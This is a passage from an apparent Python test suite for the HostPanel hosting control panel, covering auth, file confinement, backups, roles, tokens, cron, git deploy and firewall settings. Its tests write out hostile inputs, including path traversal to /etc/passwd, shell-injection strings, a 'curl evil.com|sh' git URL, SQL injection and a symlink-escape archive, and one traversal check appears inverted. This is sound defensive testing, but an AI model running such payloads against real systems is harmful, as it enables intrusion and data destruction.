"""
Functional tests for HostPanel.

Run from app/:  python3 ../tests/test_panel.py
Exercises the parts that don't need a real server: auth, the file manager,
path-traversal defence, and input validation.
"""
import os
import shutil
import sys
import tempfile


os.environ.setdefault("HP_TEST_MODE", "1")
os.environ.setdefault("HP_EXTERNAL_URL", "https://panel.test")
os.environ.setdefault("HP_TRUSTED_HOSTS", "panel.test,testserver")
# point the app at a throwaway vhost root before importing it
SANDBOX = tempfile.mkdtemp(prefix="hp-test-")
os.environ["HP_VHOST_ROOT"] = SANDBOX
BACKUP_SANDBOX = tempfile.mkdtemp(prefix="hp-backups-")
os.environ["HP_BACKUP_DIR"] = BACKUP_SANDBOX
os.environ["HP_ADMIN_USER"] = "admin"

os.environ["HP_DB"] = tempfile.mktemp(suffix=".db")
os.environ["HP_RATE_LIMIT"] = "off"

PASSWORD = "correct-horse-battery"
USER_PASSWORD = "user-password-1234"

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "app"))
from fastapi.testclient import TestClient  # noqa: E402
from fastapi import HTTPException  # noqa: E402
import core  # noqa: E402
import main  # noqa: E402
import store  # noqa: E402

store.init("admin", PASSWORD)
class Client(TestClient):
    """A TestClient that carries the CSRF token, as a browser would."""

    def request(self, method, url, **kwargs):
        if method.upper() not in ("GET", "HEAD", "OPTIONS"):
            token = self.cookies.get("hp_csrf")
            if token:
                headers = dict(kwargs.get("headers") or {})
                headers.setdefault("X-CSRF-Token", token)
                kwargs["headers"] = headers
        return super().request(method, url, **kwargs)


client = Client(main.app, follow_redirects=False)

passed = failed = 0


def check(name, condition, detail=""):
    global passed, failed
    if condition:
        passed += 1
        print(f"  \033[32mPASS\033[0m {name}")
    else:
        failed += 1
        print(f"  \033[31mFAIL\033[0m {name} {detail}")


print("\nAuthentication")
check("dashboard redirects when signed out", client.get("/").status_code == 303)
check("api returns 401 when signed out", client.get("/api/stats").status_code == 401)
check("wrong password is refused",
      b"Wrong username" in client.post("/login", data={"username": "admin", "password": "nope"}).content)

response = client.post("/login", data={"username": "admin", "password": PASSWORD})
check("correct password signs in", response.status_code == 302)
check("session cookie is httponly", "httponly" in response.headers.get("set-cookie", "").lower())

print("\nFile manager")
check("root listing works", client.get("/api/files/list").status_code == 200)

client.post("/api/files/mkdir", data={"path": "", "name": "site"})
listing = client.get("/api/files/list").json()
check("folder appears after creation",
      any(e["name"] == "site" and e["is_dir"] for e in listing["entries"]))

client.post("/api/files/write", data={"path": "site/index.html", "content": "<h1>hi</h1>"})
check("file writes and reads back",
      client.get("/api/files/read", params={"path": "site/index.html"}).text == "<h1>hi</h1>")

client.post("/api/files/write", data={"path": "site/index.html", "content": "<h1>v2</h1>"})
history_dir = os.path.join(SANDBOX, ".hostpanel-history")
private_snapshots = []
if os.path.isdir(history_dir):
    private_snapshots = [name for name in os.listdir(history_dir) if name.endswith(".bak")]
check("editing keeps a private history copy outside the document root",
      bool(private_snapshots) and not os.path.exists(os.path.join(SANDBOX, "site", "index.html.bak")))

check("rename works",
      client.post("/api/files/rename",
                  data={"path": "site/index.html", "new_name": "home.html"}).json().get("ok"))
check("chmod accepts octal",
      client.post("/api/files/chmod", data={"path": "site/home.html", "mode": "644"}).json().get("ok"))
check("chmod rejects nonsense",
      client.post("/api/files/chmod", data={"path": "site/home.html", "mode": "9z9"}).status_code == 400)

print("\nPath traversal defence")
for attempt in ["../../etc/passwd", "/etc/passwd", "site/../../../etc/shadow", "....//....//etc"]:
    status = client.get("/api/files/list", params={"path": attempt}).status_code
    check(f"blocks {attempt!r}", status in (403, 400, 404), f"got {status}")

print("\nInput validation")
from core import valid_domain, valid_ident, valid_localpart, valid_ipv4  # noqa: E402

check("accepts a normal domain", valid_domain("example.com"))
check("accepts a subdomain", valid_domain("shop.example.co.uk"))
check("rejects a domain with a semicolon", not valid_domain("evil.com;rm -rf /"))
check("rejects a domain with spaces", not valid_domain("not a domain"))
check("rejects a bare hostname", not valid_domain("localhost"))
check("rejects an injected identifier", not valid_ident("db`;DROP TABLE x;--"))
check("accepts a normal identifier", valid_ident("my_app_db"))
check("rejects a leading-digit identifier", not valid_ident("1abc"))
check("accepts a mail localpart", valid_localpart("first.last"))
check("rejects a localpart with @", not valid_localpart("a@b"))
check("accepts a valid IPv4", valid_ipv4("185.12.64.22"))
check("rejects an out-of-range IPv4", not valid_ipv4("999.1.1.1"))

print("\nCron validation")
from modules.cron import CRON_CMD_RE, validate_schedule  # noqa: E402
from fastapi import HTTPException  # noqa: E402

def rejects_schedule(value):
    try:
        validate_schedule(value)
        return False
    except HTTPException:
        return True

check("accepts a five-field schedule", not rejects_schedule("*/15 * * * *"))
check("rejects a four-field schedule", rejects_schedule("* * * *"))
check("rejects a schedule with a semicolon", rejects_schedule("* * * * *; rm -rf /"))
check("rejects a chained command", not CRON_CMD_RE.match("ls; rm -rf /"))
check("rejects a piped command", not CRON_CMD_RE.match("cat x | sh"))
check("rejects a substituted command", not CRON_CMD_RE.match("echo $(whoami)"))
check("accepts a plain command", bool(CRON_CMD_RE.match("/usr/bin/php /var/www/cron.php")))

print("\nPasswords")
from core import hash_password, verify_password  # noqa: E402

digest = hash_password("s3cret-passphrase")
check("verifies the right password", verify_password("s3cret-passphrase", digest))
check("refuses the wrong password", not verify_password("other", digest))
check("refuses an empty hash", not verify_password("x", ""))

print("\nBackups")
from pathlib import Path  # noqa: E402

site = Path(SANDBOX) / "example.com" / "public_html"
site.mkdir(parents=True, exist_ok=True)
(site / "index.html").write_text("<h1>original</h1>")

created = client.post("/api/backups", data={"include_files": "yes", "include_databases": "no"})
check("backup is created", created.status_code == 200)
archive = created.json().get("name", "")
check("archive is named by timestamp", archive.startswith("backup-") and archive.endswith(".tar.gz"))

listing = client.get("/api/backups").json()
check("backup appears in the list", listing["count"] == 1)
check("manifest records the domain", "example.com" in listing["backups"][0]["domains"])

(site / "index.html").write_text("<h1>destroyed</h1>")
wrong = client.post(f"/api/backups/{archive}/restore", data={"what": "files", "confirm": "nope"})
check("restore refuses a wrong confirmation", wrong.status_code == 400)

client.post(f"/api/backups/{archive}/restore", data={"what": "files", "confirm": archive})
check("restore brings the file back", (site / "index.html").read_text() == "<h1>original</h1>")

check("inspect lists archive contents",
      "manifest.json" in client.get(f"/api/backups/{archive}/contents").json().get("entries", []))

for bad in ["../../etc/passwd.tar.gz", "/etc/shadow.tar.gz", "notanarchive.txt"]:
    check(f"backup name {bad!r} is rejected",
          client.delete(f"/api/backups/{bad}").status_code in (400, 403, 404))

print("\nAccounts, roles and plans")
follow = Client(main.app)
admin = Client(main.app)
admin.post("/login", data={"username": "admin", "password": PASSWORD})
check("admin reports its role", admin.get("/api/accounts/me").json()["role"] == "admin")

plan = admin.post("/api/accounts/plans", data={
    "name": "TestStarter", "max_domains": 1, "max_databases": 1, "max_mailboxes": 2})
check("admin can create a plan", plan.status_code == 200)
plan_id = plan.json()["id"]

for name in ("alice", "bob"):
    created = admin.post("/api/accounts/users", data={
        "username": name, "password": USER_PASSWORD, "role": "user", "plan_id": plan_id})
    check(f"admin can create {name}", created.status_code == 200)

check("short panel passwords are refused",
      admin.post("/api/accounts/users",
                 data={"username": "weak", "password": "short", "role": "user"}).status_code == 400)

alice = Client(main.app)
alice.post("/login", data={"username": "alice", "password": USER_PASSWORD})
bob = Client(main.app)
bob.post("/login", data={"username": "bob", "password": USER_PASSWORD})

print("\nRole restrictions")
for label, path in [("services", "/api/services"), ("security", "/api/security/jails"),
                    ("user list", "/api/accounts/users")]:
    check(f"a plain user cannot reach {label}", alice.get(path).status_code == 403)
# DirectAdmin parity: customers manage their own DNS and selective backups,
# while ownership checks keep other tenants' resources out of view.
check("a plain user reaches their own DNS", alice.get("/api/dns/zones").status_code == 200)
check("a plain user reaches their own backups", alice.get("/api/backups").status_code == 200)
# Cron is deliberately per-user: a customer sees their own jobs, run under
# their own system account, not the panel's.
check("a plain user reaches their own cron, not the server's",
      alice.get("/api/cron/jobs").status_code == 200)
check("an admin can reach DNS", admin.get("/api/dns/zones").status_code == 200)
check("the DirectAdmin parity catalogue is available",
      alice.get("/api/da/features").status_code == 200)
created_ticket = alice.post("/api/da/tickets", data={
    "subject": "Test ticket", "body": "Please verify support tickets."})
check("a customer can open a support ticket", created_ticket.status_code == 200)
check("a customer can list their support tickets",
      alice.get("/api/da/tickets").status_code == 200)
check("a customer cannot manage server IPs", alice.get("/api/da/ips").status_code == 403)
check("a customer cannot run panel updates", alice.get("/api/da/updates").status_code == 403)
store.update_plan(plan_id, features="files,email")
check("a package feature set blocks disabled DNS",
      alice.get("/api/dns/zones").status_code == 403)
check("a package feature set keeps enabled files available",
      alice.get("/api/files/list").status_code == 200)
store.update_plan(plan_id, features="*")

print("\nQuotas and ownership")
alice_id = store.get_user("alice")["id"]
bob_id = store.get_user("bob")["id"]
alice_ctx = {"user_id": alice_id, "username": "alice", "role": "user"}
bob_ctx = {"user_id": bob_id, "username": "bob", "role": "user"}
admin_ctx = {"user_id": 1, "username": "admin", "role": "admin"}

store.claim(alice_id, "domain", "alice-one.com")
store.claim(bob_id, "domain", "bob-site.com")


def valid_ident_check(name):
    from core import valid_ident

    return valid_ident(name)


def blocked(action):
    try:
        action()
        return False
    except HTTPException:
        return True


check("a plan limit blocks the next domain",
      blocked(lambda: core.enforce_quota(alice_ctx, "domain")))
check("admins are not metered", core.enforce_quota(admin_ctx, "domain") is None)
check("a user cannot touch another user's domain",
      blocked(lambda: core.owns_or_admin(bob_ctx, "domain", "alice-one.com")))
check("a user can touch their own domain",
      core.owns_or_admin(alice_ctx, "domain", "alice-one.com") is None)
check("an admin can touch any domain",
      core.owns_or_admin(admin_ctx, "domain", "alice-one.com") is None)
check("ownership lists stay separate",
      store.resources_of(alice_id, "domain") == ["alice-one.com"]
      and store.resources_of(bob_id, "domain") == ["bob-site.com"])

print("\nPer-user file confinement")
alice.post("/api/files/mkdir", data={"path": "", "name": "alice-private"})
bob.post("/api/files/mkdir", data={"path": "", "name": "bob-private"})
alice_sees = [e["name"] for e in alice.get("/api/files/list").json()["entries"]]
bob_sees = [e["name"] for e in bob.get("/api/files/list").json()["entries"]]
check("alice sees only her own folder", alice_sees == ["alice-private"])
check("bob sees only his own folder", bob_sees == ["bob-private"])
check("a user cannot climb out of their home",
      alice.get("/api/files/list", params={"path": "../bob"}).status_code == 403)
check("an admin sees every home",
      {"alice", "bob"} <= {e["name"] for e in admin.get("/api/files/list").json()["entries"]})

print("\nReseller scoping")
admin.post("/api/accounts/users", data={
    "username": "reseller1", "password": "reseller-password-1", "role": "reseller"})
reseller = Client(main.app)
reseller.post("/login", data={"username": "reseller1", "password": "reseller-password-1"})
reseller.post("/api/accounts/users", data={
    "username": "carol", "password": USER_PASSWORD, "role": "user", "plan_id": plan_id})

reseller_sees = {u["username"] for u in reseller.get("/api/accounts/users").json()["users"]}
check("a reseller sees only their own customers", reseller_sees == {"reseller1", "carol"})
check("an admin sees everyone",
      {"admin", "alice", "bob", "carol"} <=
      {u["username"] for u in admin.get("/api/accounts/users").json()["users"]})
check("a reseller cannot create an admin",
      reseller.post("/api/accounts/users", data={
          "username": "sneaky", "password": USER_PASSWORD, "role": "admin"}).status_code == 400)
check("a reseller cannot manage someone else's user",
      reseller.post(f"/api/accounts/users/{alice_id}/password",
                    data={"password": "brand-new-password"}).status_code == 400)

print("\nSuspension")
carol_id = store.get_user("carol")["id"]
reseller.post(f"/api/accounts/users/{carol_id}/suspend", data={"suspended": "yes"})
check("a suspended account cannot sign in", store.authenticate("carol", USER_PASSWORD) is None)
reseller.post(f"/api/accounts/users/{carol_id}/suspend", data={"suspended": "no"})
check("unsuspending restores access", store.authenticate("carol", USER_PASSWORD) is not None)
check("the last admin cannot be deleted",
      admin.delete("/api/accounts/users/1").status_code == 400)

print("\nMissing binaries are reported cleanly")
check("a missing command gives a readable error, not a traceback",
      blocked(lambda: core.run(["definitely-not-a-real-binary"])))

print("\nPersistent sessions")
session_user = store.get_user("alice")
token = store.create_session(session_user["id"], "test-agent", "10.0.0.1")
check("a session reads back", store.read_session(token)["username"] == "alice")
check("an unknown token is refused", store.read_session("not-a-real-token") is None)
check("sessions survive a process restart (they are in SQLite)",
      store.read_session(token) is not None)

store.update_user(session_user["id"], suspended=1)
check("suspending an account kills its sessions", store.read_session(token) is None)
store.update_user(session_user["id"], suspended=0)

token2 = store.create_session(session_user["id"])
store.delete_user_sessions(session_user["id"])
check("signing an account out everywhere works", store.read_session(token2) is None)

expired = store.create_session(session_user["id"])
with store.connect() as db:
    db.execute("UPDATE sessions SET expires = 1 WHERE token = ?",
               (store._token_hash(expired),))
check("an expired session is refused", store.read_session(expired) is None)

print("\nBandwidth accounting")
from modules import bandwidth as bw  # noqa: E402

log_dir = tempfile.mkdtemp(prefix="hp-logs-")
bw.LOG_DIR = Path(log_dir)
bw.STATE_FILE = Path(tempfile.mkdtemp(prefix="hp-bwstate-")) / "state.json"
access_log = Path(log_dir) / "metered.example.access.log"


def log_line(size):
    return (f'1.2.3.4 - - [19/Jul/2026:10:00:00 +0000] '
            f'"GET /page HTTP/1.1" 200 {size} "-" "curl"\n')


access_log.write_text(log_line(1000) + log_line(2500))
bw.collect()
period = bw.current_period()
check("first pass counts every line",
      store.bandwidth_for("metered.example", period)["bytes"] == 3500)

with open(access_log, "a") as handle:
    handle.write(log_line(4000))
bw.collect()
check("a second pass counts only what is new",
      store.bandwidth_for("metered.example", period)["bytes"] == 7500)

with open(access_log, "a") as handle:
    handle.write('1.2.3.4 - - [19/Jul/2026:10:05:00 +0000] "GET /x HTTP/1.1" 200 55')
bw.collect()
check("a half-written line is not counted yet",
      store.bandwidth_for("metered.example", period)["bytes"] == 7500)

with open(access_log, "a") as handle:
    handle.write('5 "-" "curl"\n')
bw.collect()
check("the line is counted once it is complete",
      store.bandwidth_for("metered.example", period)["bytes"] == 8055)

access_log.unlink()
access_log.write_text(log_line(600))
bw.collect()
check("logrotate does not cause double counting or loss",
      store.bandwidth_for("metered.example", period)["bytes"] == 8655)

store.claim(store.get_user("bob")["id"], "domain", "metered.example")
check("a user's bandwidth sums their own domains",
      store.user_bandwidth(store.get_user("bob")["id"], period) == 8655)
check("bandwidth rejects a malformed period",
      admin.get("/api/bandwidth/domains", params={"period": "july"}).status_code == 400)

print("\nQuota capability")
from modules import quotas  # noqa: E402

capability = quotas.capability()
check("capability reports a mode", capability["mode"] in ("none", "user-quota", "xfs-project"))
check("an unenforceable filesystem explains why",
      capability["enforcing"] or bool(capability["note"]))
check("applying quotas without support is refused, not faked",
      capability["enforcing"] or
      admin.post("/api/quotas/apply").status_code == 400)
# alice was signed out by the suspension test above — proof that it works
alice.post("/login", data={"username": "alice", "password": USER_PASSWORD})
check("a plain user cannot read quota state",
      alice.get("/api/quotas/usage").status_code == 403)

print("\nLogin rate limiting")
import protect  # noqa: E402

brute = Client(main.app)
locked_at = None
for attempt in range(1, 9):
    response = brute.post("/login", data={"username": "admin", "password": "wrong"})
    if "Too many failed" in response.text:
        locked_at = attempt
        break
check("repeated failures lock the account out", locked_at is not None)
check("lockout arrives within a handful of attempts",
      locked_at is not None and locked_at <= protect.MAX_ATTEMPTS + 1)
check("the correct password is refused while locked out",
      "Too many failed" in brute.post(
          "/login", data={"username": "admin", "password": PASSWORD}).text)
check("a different account is unaffected by that lockout",
      protect.lockout_remaining("bob", "testclient") == 0)

print("\nTwo-factor authentication")
import time as _time  # noqa: E402

secret = protect.new_secret()
totp_user = store.get_user("bob")
store.update_user(totp_user["id"], totp_secret=secret, totp_active=1,
                  recovery="aaaa-bbbb,cccc-dddd")

two_fa = Client(main.app, follow_redirects=False)
first = two_fa.post("/login", data={"username": "bob", "password": USER_PASSWORD})
check("a password alone is not enough once 2FA is on", 'name="code"' in first.text)

good_code = protect.totp_at(secret, int(_time.time()) // 30)
signed_in = two_fa.post("/login", data={
    "username": "bob", "password": USER_PASSWORD, "code": good_code})
check("a valid TOTP code signs in", signed_in.status_code == 302)

bad = Client(main.app, follow_redirects=False)
check("a wrong code is refused",
      bad.post("/login", data={"username": "bob", "password": USER_PASSWORD,
                               "code": "000000"}).status_code == 200)

recovery_client = Client(main.app, follow_redirects=False)
client = Client(main.app, follow_redirects=False)
check("a recovery code signs in",
      recovery_client.post("/login", data={
          "username": "bob", "password": USER_PASSWORD,
          "code": "aaaa-bbbb"}).status_code == 302)
check("a recovery code cannot be reused",
      "aaaa-bbbb" not in (store.get_user("bob")["recovery"] or ""))
store.update_user(totp_user["id"], totp_active=0)

print("\nAudit log")
entries = protect.read_audit(50)
check("successful logins are recorded",
      any(e["action"] == "login.success" for e in entries))
check("failed logins are recorded",
      any(e["action"] == "login.failed" for e in entries))
check("recovery code use is recorded",
      any(e["action"] == "login.recovery_code_used" for e in entries))

print("\nSession tokens are not stored raw")
raw_token = store.create_session(store.get_user("admin")["id"])
with store.connect() as db:
    stored = db.execute("SELECT token FROM sessions ORDER BY created DESC LIMIT 1").fetchone()
check("the database holds a hash, not the cookie value", stored["token"] != raw_token)
check("the hash still resolves the session", store.read_session(raw_token) is not None)

print("\nSQL escaping")
for payload in ["pass'; DROP DATABASE mysql; --", "back\\slash",
                'double"quote', "line\nbreak", "ctrl\x1a"]:
    quoted = main.mysql_quote(payload)
    body = quoted[1:-1]
    check(f"escapes {payload[:18]!r}",
          quoted.startswith("'") and quoted.endswith("'")
          and "'" not in body.replace("\\'", ""))

print("\nArchive restore rejects links")
import tarfile  # noqa: E402

evil = Path(BACKUP_SANDBOX) / "backup-evil.tar.gz"
with tarfile.open(evil, "w:gz") as archive:
    info = tarfile.TarInfo("files/escape")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    archive.addfile(info)
check("a symlink inside an archive is refused",
      admin.post(f"/api/backups/{evil.name}/restore",
                 data={"what": "files", "confirm": evil.name}).status_code == 400)

print("\nOffsite backup targets are validated")
from modules import backups as _backups  # noqa: E402
_backups.OFFSITE_CONFIG = Path(tempfile.mkdtemp(prefix="hp-offsite-")) / "offsite.conf"
_backups.write_root_file = lambda path, content: path.write_text(content)
for kind, target, ok_expected in [
    ("rsync", "backup@nas.local:/vol/hostpanel", True),
    ("s3", "s3://my-backups/nightly", True),
    ("rsync", "; rm -rf /", False),
    ("s3", "s3://x", False),
]:
    status = admin.post("/api/backups/offsite", data={
        "enabled": "yes", "kind": kind, "target": target}).status_code
    check(f"{kind} target {target[:26]!r} {'accepted' if ok_expected else 'refused'}",
          (status == 200) == ok_expected)

print("\nTenant isolation")
from modules import isolation  # noqa: E402

check("isolation reports per-account status", isinstance(isolation.status(), list))
check("a plain user cannot read isolation status",
      alice.get("/api/isolation/status").status_code == 403)
check("system user names are namespaced",
      isolation.system_user_for("alice") == "hp_alice")
check("each account gets its own socket path",
      isolation.socket_for("alice", "8.3") != isolation.socket_for("bob", "8.3"))
check("provisioning an unknown account is refused",
      admin.post("/api/isolation/provision/nosuchaccount").status_code == 400)

print("\nWeb statistics")
from modules import stats as web_stats  # noqa: E402

stats_logs = tempfile.mkdtemp(prefix="hp-statlogs-")
web_stats.LOG_DIR = Path(stats_logs)
web_stats.STATE_FILE = Path(tempfile.mkdtemp(prefix="hp-statstate-")) / "state.json"
stats_log = Path(stats_logs) / "stats.example.access.log"

BROWSER = "Mozilla/5.0 (Macintosh) Safari/605"


def hit(ip, path, status, size, referrer, agent):
    return (f'{ip} - - [19/Jul/2026:10:00:00 +0000] "GET {path} HTTP/1.1" '
            f'{status} {size} "{referrer}" "{agent}"\n')


stats_log.write_text(
    hit("1.1.1.1", "/", 200, 5000, "https://google.com/", BROWSER)
    + hit("1.1.1.1", "/about", 200, 3000, "-", BROWSER)
    + hit("2.2.2.2", "/", 200, 5000, "https://google.com/", BROWSER)
    + hit("3.3.3.3", "/", 200, 5000, "-", "Googlebot/2.1")
    + hit("2.2.2.2", "/style.css", 200, 900, "-", BROWSER)
    + hit("4.4.4.4", "/missing", 404, 500, "-", BROWSER)
)
web_stats.collect()
day = store.stats_range("stats.example", 7)[0]

check("every request is counted as a hit", day["hits"] == 6)
check("repeat visits are one visitor", day["visitors"] == 3)
check("bots are counted separately, not as visitors", day["bots"] == 1)
check("assets are left out of top pages", "/style.css" not in day["pages"])
check("referrers are recorded", day["referrers"].get("https://google.com/") == 2)
check("status codes are tallied", day["statuses"].get("404") == 1)
check("visitor addresses are not retained",
      all(len(key) == 16 for key in day["visitor_keys"]))
check("a user cannot read another domain's statistics",
      alice.get("/api/stats/stats.example").status_code == 403)

print("\nGit deploy safety")
from modules.git import BRANCH_RE, BUILD_STEPS, HTTPS_REPO_RE, SSH_REPO_RE  # noqa: E402


def repo_allowed(url):
    return bool(HTTPS_REPO_RE.match(url) or SSH_REPO_RE.match(url))


check("an https repo is accepted", repo_allowed("https://github.com/user/repo.git"))
check("an ssh repo is accepted", repo_allowed("git@github.com:user/repo.git"))
check("an ext:: url is refused", not repo_allowed("ext::sh -c 'curl evil.com|sh'"))
check("a file:// url is refused", not repo_allowed("file:///etc/passwd"))
check("a chained command is refused",
      not repo_allowed("https://github.com/u/r.git; rm -rf /"))
check("an argument-shaped url is refused", not repo_allowed("--upload-pack=/bin/sh"))
check("a branch with a semicolon is refused", not BRANCH_RE.match("main; whoami"))
check("build steps come from a fixed list", set(BUILD_STEPS) == {"none", "composer", "npm-build"})

print("\nApplication catalogue")
from modules import apps  # noqa: E402

check("every catalogue download is https",
      all(a["url"].startswith("https://") for a in apps.CATALOGUE.values()))
check("the catalogue is fixed, not caller-supplied",
      admin.post("/api/apps/install", data={
          "app_key": "https://evil.example/shell.tar.gz",
          "domain": "example.com"}).status_code == 400)
check("installing to a domain you do not own is refused",
      alice.post("/api/apps/install", data={
          "app_key": "wordpress", "domain": "bob-site.com"}).status_code == 403)
check("WordPress salts are unique per install",
      apps.generate_salts() != apps.generate_salts())

print("\nSpam filtering")
from modules import spam  # noqa: E402

check("spam status is readable", admin.get("/api/spam/status").status_code == 200)
check("thresholds must increase",
      admin.post("/api/spam/thresholds", data={
          "greylist": 9, "add_header": 5, "reject": 15}).status_code == 400)
check("a dangerously low reject threshold is refused",
      admin.post("/api/spam/thresholds", data={
          "greylist": 2, "add_header": 4, "reject": 6}).status_code == 400)
check("a list entry must be an address or domain",
      admin.post("/api/spam/lists", data={
          "entry": "not an address", "list_name": "allow"}).status_code == 400)
check("a plain user cannot change thresholds",
      alice.post("/api/spam/thresholds", data={
          "greylist": 4, "add_header": 6, "reject": 15}).status_code == 403)

print("\nAPI tokens")
issued = admin.post("/api/tokens", data={
    "name": "deploy script", "scopes": "read,sites", "days": 30})
check("a token is issued", issued.status_code == 200)
raw_api_token = issued.json().get("token", "")
check("the token is prefixed so it is recognisable", raw_api_token.startswith("hp_"))
check("the token is shown only once", "only time" in issued.json().get("note", ""))

with store.connect() as db:
    stored_token = db.execute("SELECT token FROM api_tokens ORDER BY id DESC LIMIT 1").fetchone()
check("tokens are hashed at rest", stored_token["token"] != raw_api_token)

anonymous = Client(main.app)
check("no credentials are refused", anonymous.get("/api/stats").status_code == 401)
check("a bearer token authenticates",
      anonymous.get("/api/stats",
                    headers={"Authorization": f"Bearer {raw_api_token}"}).status_code == 200)
check("a wrong token is refused",
      anonymous.get("/api/stats",
                    headers={"Authorization": "Bearer hp_notreal"}).status_code == 401)

token_id = admin.get("/api/tokens").json()["tokens"][0]["id"]
admin.delete(f"/api/tokens/{token_id}")
check("a revoked token stops working",
      anonymous.get("/api/stats",
                    headers={"Authorization": f"Bearer {raw_api_token}"}).status_code == 401)
check("a customer cannot mint an admin-scoped token",
      alice.post("/api/tokens", data={"name": "sneaky", "scopes": "admin"}).status_code == 400)
check("an unknown scope is refused",
      admin.post("/api/tokens", data={"name": "x", "scopes": "root"}).status_code == 400)
check("token creation is audited",
      any(e["action"] == "token.created" for e in protect.read_audit(50)))

print("\nSite tools validation")
from modules import sitetools  # noqa: E402

check("a redirect source must be a path",
      not sitetools.PATH_RE.match("http://evil.example/x"))
check("a plain path is accepted", bool(sitetools.PATH_RE.match("/old-page")))
check("a path with a semicolon is refused",
      not sitetools.PATH_RE.match("/x; return 200"))
check("an absolute URL target is accepted",
      bool(sitetools.URL_RE.match("https://example.com/new")))
check("a target with a newline is refused",
      not sitetools.URL_RE.match("https://example.com/\nadd_header X 1"))
check("blocking a malformed address is refused",
      admin.post("/api/sitetools/example.com/blocked",
                 data={"address": "not-an-ip"}).status_code in (400, 403))
check("site tools on a domain you do not own are refused",
      alice.get("/api/sitetools/bob-site.com/summary").status_code == 403)

print("\nApplication servers")
from modules import appservers  # noqa: E402

check("runtimes are a fixed set", set(appservers.RUNTIMES) == {"node", "python"})
check("an entry point may not be a command",
      not appservers.ENTRY_RE.match("server.js; rm -rf /"))
check("an entry point may not climb directories",
      appservers.ENTRY_RE.match("../../etc/passwd") is not None
      and ".." in "../../etc/passwd")
check("a plain entry point is accepted", bool(appservers.ENTRY_RE.match("server.js")))
check("ports come from the private range",
      appservers.PORT_RANGE.start >= 20000 and appservers.PORT_RANGE.stop <= 65535)
check("the unit template confines the process",
      all(directive in appservers.UNIT_TEMPLATE for directive in
          ("NoNewPrivileges=true", "ProtectSystem=strict", "ProtectHome=true",
           "MemoryMax=", "RestrictNamespaces=true")))
check("the unit template runs as the tenant, not the panel",
      "User={system_user}" in appservers.UNIT_TEMPLATE)
check("creating an app on someone else's domain is refused",
      alice.post("/api/appservers/apps", data={
          "name": "sneaky", "domain": "bob-site.com",
          "runtime": "node"}).status_code == 403)
check("an unknown runtime is refused",
      admin.post("/api/appservers/apps", data={
          "name": "app1", "domain": "example.com",
          "runtime": "perl"}).status_code == 400)

print("\nPer-user cron")
from modules import cron as cron_module  # noqa: E402

check("an admin's jobs run as the panel user",
      cron_module.crontab_owner({"username": "admin", "role": "admin"}) == "hp_admin"
      or cron_module.crontab_owner({"username": "admin", "role": "admin"})
      == cron_module.PANEL_USER)
check("a customer without a system user falls back safely",
      cron_module.crontab_owner({"username": "alice", "role": "user"})
      in (cron_module.PANEL_USER, "hp_alice"))
check("a customer can reach the cron list now",
      alice.get("/api/cron/jobs").status_code == 200)
check("shell operators are still refused in commands",
      not cron_module.CRON_CMD_RE.match("php x.php && curl evil.com"))

print("\nSieve rules and vacation replies")
from modules import sieve  # noqa: E402

script = sieve.build_script({
    "vacation": {"active": True, "days": 5, "subject": "Away",
                 "message": "Back on Monday.", "addresses": ["hello@example.com"]},
    "rules": [{"name": "Invoices", "field": "subject", "match": "contains",
               "value": "invoice", "action": "fileinto", "target": "Finance",
               "stop": True}],
})
check("the script declares the extensions it uses",
      script.startswith('require ["fileinto", "vacation"];'))
check("the vacation reply has an interval", ":days 5" in script)
check("a rule becomes a header test", 'if header :contains "Subject" "invoice"' in script)
check("fileinto names the folder", 'fileinto "Finance";' in script)
check("stop is emitted when asked for", "    stop;" in script)

check("a value with a quote cannot escape the string",
      '\\"' in sieve.build_script({"rules": [{
          "name": "x", "field": "from", "match": "is", "value": 'a"b',
          "action": "keep", "target": "", "stop": False}], "vacation": None}))
check("only known fields are accepted", set(sieve.FIELDS) == {"from", "to", "subject", "cc"})
check("only known actions are accepted",
      sieve.ACTIONS == {"fileinto", "discard", "redirect", "keep", "stop"})
check("a folder name with a newline is refused",
      not sieve.FOLDER_RE.match("Inbox\nrequire [\"vnd.dovecot.execute\"];"))
check("sieve rules on someone else's mailbox are refused",
      alice.get("/api/sieve/hello@bob-site.com/rules").status_code == 403)

print("\nCertificate validation")
from modules import certs  # noqa: E402

check("a non-PEM upload is refused",
      admin.post("/api/certs/example.com", data={
          "certificate": "not a certificate",
          "private_key": "nor is this"}).status_code == 400)
check("a certificate regex requires the PEM envelope",
      not certs.PEM_CERT_RE.search("-----BEGIN CERTIFICATE-----")
      and bool(certs.PEM_CERT_RE.search(
          "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----")))
check("wildcard coverage is computed correctly",
      certs.covers({"names": ["*.example.com"]}, "shop.example.com")
      and not certs.covers({"names": ["*.example.com"]}, "a.b.example.com")
      and not certs.covers({"names": ["*.example.com"]}, "example.com"))
check("exact coverage is computed correctly",
      certs.covers({"names": ["example.com", "www.example.com"]}, "example.com"))
check("a user cannot upload for another domain",
      alice.post("/api/certs/bob-site.com", data={
          "certificate": "x", "private_key": "y"}).status_code == 403)

print("\nWeb application firewall")
from modules import waf  # noqa: E402

check("availability is reported honestly",
      "modsecurity" in admin.get("/api/waf/availability").json())
check("paranoia levels are 1 to 4", set(waf.PARANOIA) == {1, 2, 3, 4})
check("an invalid mode is refused",
      admin.post("/api/waf/example.com", data={"mode": "paranoid"}).status_code == 400)
check("an invalid paranoia level is refused",
      admin.post("/api/waf/example.com", data={"mode": "detect",
                                               "paranoia": 9}).status_code == 400)
check("a rule id must be six digits",
      not waf.RULE_ID_RE.match("94211; DROP") and bool(waf.RULE_ID_RE.match("942110")))
check("a user cannot configure the firewall on another domain",
      alice.post("/api/waf/bob-site.com", data={"mode": "detect"}).status_code == 403)

print("\nSubdomains and aliases")
from modules import subdomains  # noqa: E402

check("a label must be one name part",
      bool(subdomains.LABEL_RE.match("shop"))
      and not subdomains.LABEL_RE.match("shop.example.com"))
check("a label with a semicolon is refused",
      not subdomains.LABEL_RE.match("shop; rm -rf /"))
check("mail labels are reserved", "mail" in subdomains.RESERVED and "www" in subdomains.RESERVED)
check("the parent of a subdomain is derived correctly",
      subdomains.parent_of("shop.example.com") == "example.com"
      and subdomains.parent_of("example.com") == "example.com")
check("a reserved label is refused",
      admin.post("/api/subdomains/subdomain", data={
          "label": "mail", "parent": "example.com"}).status_code == 400)
check("a subdomain under someone else's domain is refused",
      alice.post("/api/subdomains/subdomain", data={
          "label": "shop", "parent": "bob-site.com"}).status_code == 403)
check("parking a domain on itself is refused",
